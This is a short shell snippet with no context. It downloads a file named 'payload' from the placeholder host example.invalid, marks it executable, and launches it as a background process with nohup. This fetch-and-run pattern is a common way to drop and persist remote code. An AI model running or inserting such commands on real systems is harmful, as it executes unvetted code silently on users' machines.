payload=/tmp/example-agent
curl -o "$payload" https://example.invalid/example-agent
chmod +x "$payload"
nohup "$payload" >/tmp/example-agent.log 2>&1
